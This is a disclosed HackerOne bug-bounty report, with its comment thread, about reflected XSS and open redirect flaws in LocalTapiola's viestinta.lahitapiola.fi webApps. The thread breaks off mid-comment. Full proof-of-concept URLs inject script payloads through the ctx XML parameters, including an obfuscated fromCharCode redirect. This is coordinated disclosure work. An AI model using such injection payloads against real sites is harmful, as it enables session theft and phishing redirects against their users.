{"id":191387,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTEzODc=","url":"https://hackerone.com/reports/191387","title":"Reflected XSS and Open Redirect in several parameters (viestinta.lahitapiola.fi)","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2016-12-15T12:09:36.093Z","submitted_at":"2016-12-15T12:09:36.093Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"sandh0t","url":"/sandh0t","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/006/299/944129af89e7f714b860d3bf18fdb3500424b999_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8416,"url":"https://hackerone.com/localtapiola","handle":"localtapiola","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"LocalTapiola","twitter_handle":"","website":"http://www.lahitapiola.fi","about":"LocalTapiolaâ€™s products and services cover non-life, life and pension insurance, as well as investment and saving services."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-03-06T09:08:43.330Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-02-04T09:08:26.697Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Basic report information\n**Summary:** \nHi,\nThe values within the **ctx** tag, are not filtered, they are reflected inside a javascript code  in http://viestinta.lahitapiola.fi/webApp/APP3242, which can be exploited to perform an  XSS Attack.\n\nThe parameter are:\n**ctx[othersDriving][ma_gallup][count]**\n**ctx[ownDriving][ma_gallup][count]**\n\n**Description:** \nThe values inside the **ctx** tag \u003ccount\u003e\u003c/count\u003e are not properly sanitized  in the following POST request :\n```\nPOST /webApp/APP3242 HTTP/1.1\nHost: viestinta.lahitapiola.fi\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 1378\n\nctx=\u003cctx lang=\"en\" date=\"2016-12-15T11:03:03Z\" _target=\"web\" webApp-id=\"328793322\" _folderModel=\"nmsRecipient\"\u003e\u003cuserInfo datakitInDatabase=\"true\" homeDir=\"\" instanceLocale=\"en-US\" locale=\"en-US\" login=\"webapp\" loginCS=\"Web applications agent (webapp)\" loginId=\"3290\" noConsoleCnx=\"true\" orgUnitId=\"0\" theme=\"\" timezone=\"Europe/Helsinki\" xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns=\"urn:xtk:session\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\u003e\u003clogin-right right=\"admin\"/\u003e\u003c/userInfo\u003e\u003ctimezone current=\"Europe/Helsinki\" changed=\"false\"/\u003e\u003cactivityHistory\u003e\u003cactivity name=\"page\"/\u003e\u003cactivity name=\"query\"/\u003e\u003cactivity name=\"query2\"/\u003e\u003cactivity name=\"prefill\"/\u003e\u003c/activityHistory\u003e\u003cothersDriving\u003e\u003cma_gallup othersDriving=\"\"\u003e\u003ccount\u003e126\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup othersDriving=\"vieressa_neuvominen\"\u003e\u003ccount\u003e7777\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup othersDriving=\"huonot_parkkeeraustaidot\"\u003e\u003ccount\u003e906\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup othersDriving=\"ajamisen_hitaus\"\u003e\u003ccount\u003e1963\u003c/count\u003e\u003c/ma_gallup\u003e\u003c/othersDriving\u003e\u003cownDriving\u003e\u003cma_gallup ownDriving=\"liikennemerkit\"\u003e\u003ccount\u003e578\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup ownDriving=\"\"\u003e\u003ccount\u003e126\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup ownDriving=\"taskuparkkeeraus\"\u003e\u003ccount\u003e5555\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup ownDriving=\"kartturin_taidot\"\u003e\u003ccount\u003e1605\u003c/count\u003e\u003c/ma_gallup\u003e\u003c/ownDriving\u003e\u003c/ctx\u003e\n\n```\n\nUsing this payload **value ; alert()** to trigger an XSS.\n\nFurthermore this request can be changed from POST request to a GET, so an attacker can just send the following link to the victim to perform a successful remote attack.\n\n```\nhttp://viestinta.lahitapiola.fi/webApp/APP3242?ctx=\u003cctx+lang=\"en\"+date=\"2016-12-15T11:03:03Z\"+_target=\"web\"+webApp-id=\"328793322\"+_folderModel=\"nmsRecipient\"\u003e\u003cuserInfo+datakitInDatabase=\"true\"+homeDir=\"\"+instanceLocale=\"en-US\"+locale=\"en-US\"+login=\"webapp\"+loginCS=\"Web+applications+agent+(webapp)\"+loginId=\"3290\"+noConsoleCnx=\"true\"+orgUnitId=\"0\"+theme=\"\"+timezone=\"Europe/Helsinki\"+xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"+xmlns:ns=\"urn:xtk:session\"+xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"+xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\u003e\u003clogin-right+right=\"admin\"/\u003e\u003c/userInfo\u003e\u003ctimezone+current=\"Europe/Helsinki\"+changed=\"false\"/\u003e\u003cactivityHistory\u003e\u003cactivity+name=\"page\"/\u003e\u003cactivity+name=\"query\"/\u003e\u003cactivity+name=\"query2\"/\u003e\u003cactivity+name=\"prefill\"/\u003e\u003c/activityHistory\u003e\u003cothersDriving\u003e\u003cma_gallup+othersDriving=\"\"\u003e\u003ccount\u003e126\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+othersDriving=\"vieressa_neuvominen\"\u003e\u003ccount\u003e7777;+alert()\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+othersDriving=\"huonot_parkkeeraustaidot\"\u003e\u003ccount\u003e906\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+othersDriving=\"ajamisen_hitaus\"\u003e\u003ccount\u003e1963\u003c/count\u003e\u003c/ma_gallup\u003e\u003c/othersDriving\u003e\u003cownDriving\u003e\u003cma_gallup+ownDriving=\"liikennemerkit\"\u003e\u003ccount\u003e578\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+ownDriving=\"\"\u003e\u003ccount\u003e126\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+ownDriving=\"taskuparkkeeraus\"\u003e\u003ccount\u003e5555\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+ownDriving=\"kartturin_taidot\"\u003e\u003ccount\u003e1605\u003c/count\u003e\u003c/ma_gallup\u003e\u003c/ownDriving\u003e\u003c/ctx\u003e\n\n```\n**Domain:** \n       viestinta.lahitapiola.fi\n\n## Browsers / Apps Verified In:\n\n  All Browsers\n\n## Steps To Reproduce:\n\n  1. Just go to :\n\n```\nhttp://viestinta.lahitapiola.fi/webApp/APP3242?ctx=\u003cctx+lang=\"en\"+date=\"2016-12-15T11:03:03Z\"+_target=\"web\"+webApp-id=\"328793322\"+_folderModel=\"nmsRecipient\"\u003e\u003cuserInfo+datakitInDatabase=\"true\"+homeDir=\"\"+instanceLocale=\"en-US\"+locale=\"en-US\"+login=\"webapp\"+loginCS=\"Web+applications+agent+(webapp)\"+loginId=\"3290\"+noConsoleCnx=\"true\"+orgUnitId=\"0\"+theme=\"\"+timezone=\"Europe/Helsinki\"+xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"+xmlns:ns=\"urn:xtk:session\"+xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"+xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\u003e\u003clogin-right+right=\"admin\"/\u003e\u003c/userInfo\u003e\u003ctimezone+current=\"Europe/Helsinki\"+changed=\"false\"/\u003e\u003cactivityHistory\u003e\u003cactivity+name=\"page\"/\u003e\u003cactivity+name=\"query\"/\u003e\u003cactivity+name=\"query2\"/\u003e\u003cactivity+name=\"prefill\"/\u003e\u003c/activityHistory\u003e\u003cothersDriving\u003e\u003cma_gallup+othersDriving=\"\"\u003e\u003ccount\u003e126;+alert(document.domain)\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+othersDriving=\"vieressa_neuvominen\"\u003e\u003ccount\u003e7777\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+othersDriving=\"huonot_parkkeeraustaidot\"\u003e\u003ccount\u003e906\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+othersDriving=\"ajamisen_hitaus\"\u003e\u003ccount\u003e1963\u003c/count\u003e\u003c/ma_gallup\u003e\u003c/othersDriving\u003e\u003cownDriving\u003e\u003cma_gallup+ownDriving=\"liikennemerkit\"\u003e\u003ccount\u003e578\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+ownDriving=\"\"\u003e\u003ccount\u003e126\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+ownDriving=\"taskuparkkeeraus\"\u003e\u003ccount\u003e5555\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+ownDriving=\"kartturin_taidot\"\u003e\u003ccount\u003e1605\u003c/count\u003e\u003c/ma_gallup\u003e\u003c/ownDriving\u003e\u003c/ctx\u003e\n```\n\n## Additional material\n\n  See Attached POC\n\n## Related reports, best practices\n\n  [OWASP-recommendations]\n ","bounty_amount":"450.0","formatted_bounty":"$450","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":143776,"file_name":"xss2.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/143/776/f836e45f0ac8a354679d0f48e5ba3e64b70fbac1/xss2.PNG?response-content-disposition=attachment%3B%20filename%3D%22xss2.PNG%22%3B%20filename%2A%3DUTF-8%27%27xss2.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUWIS6VCD%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T135745Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQD5qsiIq7Ck1i9U3MTr1Jo1%2F3EDxH2PPmsZwQtKB8ZKHgIhAJ3GPiydxb4RL1gx8xsJzOsLrxI5jwwj0tTnFObt0P14KoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgzIOEXrWQ9u1AQUX0Uq1wOcZjaNugHMVKWeqymcjzBFh6Y1k6CMr8RU%2By%2FCZ4rv9GZiC2wT8OmGhsgt00HKgFWK1MpUtynFdgo25n2Z3Hw%2BIbYI8vc1JJdIjhuurHucoJNgsKCs02JzKj8GyJUC61pv0yaDJyGUVPN694UkMEyn%2FPWTQr%2BUTeBhbmczKhCGUj%2FpPN2iIbYsRZixR6LxxOf2cvjX2jSZkAk%2FSVsApfA8g%2BhlsBjDUA9%2B8YRWNjxfWtxQ%2Foo1xWaWyO6R0C2NxkUOjfjpECLEYEQ7vJ%2Bmu27ctvQxX8DIgxS97NsRC7LzasVsLHVmntXBAZ7PuEI4sWc5xs%2Fk66Q906%2BB%2BzvloL3Axk31g5hiymuem0csQnadqDxLt8p2LjIDw8YcQPN5NH0kGSb6mQrkldEFgJqP84RMAJRIxUJWDd%2B%2BPuzQFsioIExGAI0yAK1L2jOitJOooOZlWfFIzjDUn7dj9xSziPydE91tqmI514stzkBU2GFbRIrklzPo3g7n0zD%2FNL7OLEHlmYWBTM9ot%2B6bu4Bck8DrV4VVi9QHnC5ukEnqLU7NSIQGPaibC1SdOVjM2Iv6X9PdR0rR6F07TM%2FRs9G%2B%2BYIK1kHXDHgTN6Tqa9Kn%2B8BfoEt%2BZqnCJGYwv%2ByQiwY6pAFugzNge1CtFW4ATDcRX3hNOdndjPYZIsRGJutSgqHjCwxt8awsI7yZQ6vRxlp6LSSmoSK%2BkQ3evRcXC09cJ%2F1e4JrEeYASE3WVsCxAQVnPVIMtkim2T%2BFMB87kfQL6qAH6iiBO2KVli0mZ4%2BX%2ByxoxRVipnwQh%2B2l8LEnW1ug4kWwPqBp1%2F3G0D3IViaM%2F6KEe0O675l3jsd9YY%2BgtdY9L6zl0yg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=8cc19292a15f1148677c6c7a2ec1855d80278dc9cd3f0d8d34bb912f6259fa3a","file_size":38633,"type":"image/png"}],"allow_singular_disclosure_at":"2017-03-06T09:08:26.741Z","allow_singular_disclosure_after":-145169358.90670377,"singular_disclosure_allowed":true,"vote_count":12,"voters":["delimitry","tk0","sandh0t","circuit","mpz","dkd","eveeez","silv3rpoision","vishnuraj","rbcafe","and 2 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1366350,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, thanks for your thorough reports. This seems like a systemic issue in the platform with all the XSS's. The fix is most likely global (and underlying) and for that reason we will also process all similar and related findings as one. I would ask you to add you possible new findings into either this report or #191095 - this will also make it easier to communicate about possible retesting etc. Thanks.","automated_response":false,"created_at":"2016-12-15T12:26:13.993Z","updated_at":"2016-12-15T12:26:13.993Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1367262,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nThe same issue can also be found in : **http://viestinta.lahitapiola.fi/webApp/lapsuudenturva**\nusing this payload **1){} alert(document.domain); if(1.** inside this parameters:\n**ctx[vars][savings]**\n**ctx[vars][accident]**\n**ctx[vars][child]**\n**ctx[vars][seriousIllness]**\n**ctx[vars][contacted]**\n\n**PoC**:\n\n```\nhttp://viestinta.lahitapiola.fi/webApp/lapsuudenturva?ctx=\u003cctx lang=\"en\" _target=\"web\" webApp-id=\"48590459\" _folderModel=\"nmsRecipient\"\u003e\u003cuserInfo datakitInDatabase=\"true\" homeDir=\"\" instanceLocale=\"en-US\" locale=\"en-US\" login=\"webapp\" loginCS=\"Web applications agent (webapp)\" loginId=\"3290\" noConsoleCnx=\"true\" orgUnitId=\"0\" theme=\"\" timezone=\"Europe/Helsinki\" xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns=\"urn:xtk:session\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\u003e\u003clogin-right right=\"admin\"/\u003e\u003c/userInfo\u003e\u003ctimezone current=\"Europe/Helsinki\" changed=\"false\"/\u003e\u003cvars\u003e\u003csavings\u003e1){} alert(document.domain); if(1.\u003c/savings\u003e\u003caccident\u003e2\u003c/accident\u003e\u003cchild\u003e3\u003c/child\u003e\u003cseriousIllness\u003e4\u003c/seriousIllness\u003e\u003ccontacted\u003e5\u003c/contacted\u003e\u003c/vars\u003e\u003cactivityHistory\u003e\u003cactivity name=\"page2\"/\u003e\u003cactivity name=\"start\"/\u003e\u003c/activityHistory\u003e\u003c/ctx\u003e\n\n```","automated_response":false,"created_at":"2016-12-15T18:38:34.368Z","updated_at":"2016-12-15T18:38:34.368Z","actor":{"username":"sandh0t","cleared":true,"url":"/sandh0t","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/299/944129af89e7f714b860d3bf18fdb3500424b999_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1368068,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2016-12-15T23:46:20.974Z","updated_at":"2016-12-15T23:46:20.974Z","additional_data":{"old_title":"Reflected XSS in viestinta.lahitapiola.fi/webApp/APP3242","new_title":"Reflected XSS in several parameters (viestinta.lahitapiola.fi)"},"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1374914,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, the issues you have found should now have been fixed, you are welcome to re-test.","automated_response":false,"created_at":"2016-12-19T20:07:08.215Z","updated_at":"2016-12-19T20:07:08.215Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1375461,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\nHi localtapiola-thomas,\n\nThis issue is not fixed !!\n\nIn **http://viestinta.lahitapiola.fi/webApp/lapsuudenturva**  the parameters are now properly filtered, expect for this one: **ctx[vars][contacted]**, which still can be exploited to trigger an XSS, using this payload: \n**1){} alert(document.domain); if(1**\n\n**PoC**\n```\nhttp://viestinta.lahitapiola.fi/webApp/lapsuudenturva?ctx=\u003cctx lang=\"en\" _target=\"web\" webApp-id=\"48590459\" _folderModel=\"nmsRecipient\"\u003e\u003cuserInfo datakitInDatabase=\"true\" homeDir=\"\" instanceLocale=\"en-US\" locale=\"en-US\" login=\"webapp\" loginCS=\"Web applications agent (webapp)\" loginId=\"3290\" noConsoleCnx=\"true\" orgUnitId=\"0\" theme=\"\" timezone=\"Europe/Helsinki\" xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns=\"urn:xtk:session\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\u003e\u003clogin-right right=\"admin\"/\u003e\u003c/userInfo\u003e\u003ctimezone current=\"Europe/Helsinki\" changed=\"false\"/\u003e\u003cvars\u003e\u003csavings\u003e1\u003c/savings\u003e\u003caccident\u003e2\u003c/accident\u003e\u003cchild\u003e3\u003c/child\u003e\u003cseriousIllness\u003e4\u003c/seriousIllness\u003e\u003ccontacted\u003e1){} alert(document.domain); if(1\u003c/contacted\u003e\u003c/vars\u003e\u003cactivityHistory\u003e\u003cactivity name=\"page2\"/\u003e\u003cactivity name=\"start\"/\u003e\u003c/activityHistory\u003e\u003c/ctx\u003e\n```\n\nFor the other webApp, i found no issue in them.\n","automated_response":false,"created_at":"2016-12-19T22:10:04.860Z","updated_at":"2016-12-19T22:10:04.860Z","actor":{"username":"sandh0t","cleared":true,"url":"/sandh0t","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/299/944129af89e7f714b860d3bf18fdb3500424b999_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":145190,"filename":"xss_2.PNG","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/145/190/de82f7d1cad496140eab37396a10c3b8045863c2/xss_2.PNG?response-content-disposition=attachment%3B%20filename%3D%22xss_2.PNG%22%3B%20filename%2A%3DUTF-8%27%27xss_2.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUWIS6VCD%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T135745Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQD5qsiIq7Ck1i9U3MTr1Jo1%2F3EDxH2PPmsZwQtKB8ZKHgIhAJ3GPiydxb4RL1gx8xsJzOsLrxI5jwwj0tTnFObt0P14KoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgzIOEXrWQ9u1AQUX0Uq1wOcZjaNugHMVKWeqymcjzBFh6Y1k6CMr8RU%2By%2FCZ4rv9GZiC2wT8OmGhsgt00HKgFWK1MpUtynFdgo25n2Z3Hw%2BIbYI8vc1JJdIjhuurHucoJNgsKCs02JzKj8GyJUC61pv0yaDJyGUVPN694UkMEyn%2FPWTQr%2BUTeBhbmczKhCGUj%2FpPN2iIbYsRZixR6LxxOf2cvjX2jSZkAk%2FSVsApfA8g%2BhlsBjDUA9%2B8YRWNjxfWtxQ%2Foo1xWaWyO6R0C2NxkUOjfjpECLEYEQ7vJ%2Bmu27ctvQxX8DIgxS97NsRC7LzasVsLHVmntXBAZ7PuEI4sWc5xs%2Fk66Q906%2BB%2BzvloL3Axk31g5hiymuem0csQnadqDxLt8p2LjIDw8YcQPN5NH0kGSb6mQrkldEFgJqP84RMAJRIxUJWDd%2B%2BPuzQFsioIExGAI0yAK1L2jOitJOooOZlWfFIzjDUn7dj9xSziPydE91tqmI514stzkBU2GFbRIrklzPo3g7n0zD%2FNL7OLEHlmYWBTM9ot%2B6bu4Bck8DrV4VVi9QHnC5ukEnqLU7NSIQGPaibC1SdOVjM2Iv6X9PdR0rR6F07TM%2FRs9G%2B%2BYIK1kHXDHgTN6Tqa9Kn%2B8BfoEt%2BZqnCJGYwv%2ByQiwY6pAFugzNge1CtFW4ATDcRX3hNOdndjPYZIsRGJutSgqHjCwxt8awsI7yZQ6vRxlp6LSSmoSK%2BkQ3evRcXC09cJ%2F1e4JrEeYASE3WVsCxAQVnPVIMtkim2T%2BFMB87kfQL6qAH6iiBO2KVli0mZ4%2BX%2ByxoxRVipnwQh%2B2l8LEnW1ug4kWwPqBp1%2F3G0D3IViaM%2F6KEe0O675l3jsd9YY%2BgtdY9L6zl0yg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=80c7d4303fd182970e8f9371d9081a1061a892d365842ac270f44a8be4162933"}],"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1389229,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nI just want to add that this issue can be also  exploited to perform an open redirection, using this payload:\n\n**1){} window.location.href = String.fromCharCode(47,47,103,111,111,103,108,101,46,99,111,109); if(1**\n\n**PoC**:\n```\nhttp://viestinta.lahitapiola.fi/webApp/lapsuudenturva?ctx=\u003cctx lang=\"en\" _target=\"web\" webApp-id=\"48590459\" _folderModel=\"nmsRecipient\"\u003e\u003cuserInfo datakitInDatabase=\"true\" homeDir=\"\" instanceLocale=\"en-US\" locale=\"en-US\" login=\"webapp\" loginCS=\"Web applications agent (webapp)\" loginId=\"3290\" noConsoleCnx=\"true\" orgUnitId=\"0\" theme=\"\" timezone=\"Europe/Helsinki\" xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns=\"urn:xtk:session\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\u003e\u003clogin-right right=\"admin\"/\u003e\u003c/userInfo\u003e\u003ctimezone current=\"Europe/Helsinki\" changed=\"false\"/\u003e\u003cvars\u003e\u003csavings\u003e1\u003c/savings\u003e\u003caccident\u003e2\u003c/accident\u003e\u003cchild\u003e3\u003c/child\u003e\u003cseriousIllness\u003e4\u003c/seriousIllness\u003e\u003ccontacted\u003e1){} window.location.href = String.fromCharCode(47,47,103,111,111,103,108,101,46,99,111,109); if(1\u003c/contacted\u003e\u003c/vars\u003e\u003cactivityHistory\u003e\u003cactivity name=\"page2\"/\u003e\u003cactivity name=\"start\"/\u003e\u003c/activityHistory\u003e\u003c/ctx\u003e\n```\n\nWhen you visit this link, a redirection will be made to **google.com**,","automated_response":false,"created_at":"2016-12-28T17:18:26.472Z","updated_at":"2016-12-28T17:18:26.472Z","actor":{"username":"sandh0t","cleared":true,"url":"/sandh0t","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/299/944129af89e7f714b860d3bf18fdb3500424b999_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1393783,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nI noticed that you consider Open Redirection vuln more serious than XSS, so i am asking you if you can change the report's title from XSS only to XSS +  Open Redirection, and consider both the issues in this submission.\n\nbest regards.","automated_response":false,"created_at":"2017-01-01T19:03:55.669Z","updated_at":"2017-01-01T19:03:55.669Z","actor":{"username":"sandh0t","cleared":true,"url":"/sandh0t","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/299/944129af89e7f714b860d3bf18fdb3500424b999_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1393786,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2017-01-01T19:08:53.386Z","updated_at":"2017-01-01T19:08:53.386Z","additional_data":{"old_title":"Reflected XSS in several parameters (viestinta.lahitapiola.fi)","new_title":"Reflected XSS and Open Redirect in several parameters (viestinta.lahitapiola.fi)"},"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1458180,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nI noticed that you fixed this issue, would confirm please !","automated_response":false,"created_at":"2017-02-02T10:18:35.950Z","updated_at":"2017-02-02T10:18:35.950Z","actor":{"username":"sandh0t","cleared":true,"url":"/sandh0t","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/299/944129af89e7f714b860d3bf18fdb3500424b999_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1458547,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes indeed - did not have time to update the status yet. Good to hear that you confirm, we will close and resolve this. You OK with public disclosure?","automated_response":false,"created_at":"2017-02-02T14:26:55.398Z","updated_at":"2017-02-02T14:26:55.398Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1458567,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, sure, any updates regarding the report #194199, It's been more than a month since the last 